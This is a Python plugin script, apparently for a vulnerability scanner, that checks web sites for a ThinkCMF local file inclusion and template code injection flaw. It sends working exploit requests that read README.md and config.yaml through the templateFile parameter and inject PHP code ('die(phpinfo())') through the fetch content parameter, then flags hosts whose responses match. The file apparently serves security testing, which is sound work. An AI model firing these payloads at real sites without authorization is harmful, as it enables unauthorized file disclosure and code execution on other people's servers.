#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    thinkcmf lfi
    https://www.zjun.info/2020/thinkcmfexp.html
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            poc_list = ["index.php?a=display&templateFile=README.md",
                        "index.php?a=display&templateFile=config.yaml",
                        "index.php?a=fetch&content=<php>die(phpinfo())</php>"]
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    for poc in poc_list:
                        url = path + poc
                        async with session.get(url=url) as res:
                            if res and res.status == 200:
                                text = await res.text()
                                if '## README' in text or 'name: thinkcmf' in text or 'php.ini' in text:
                                    yield url
                                    
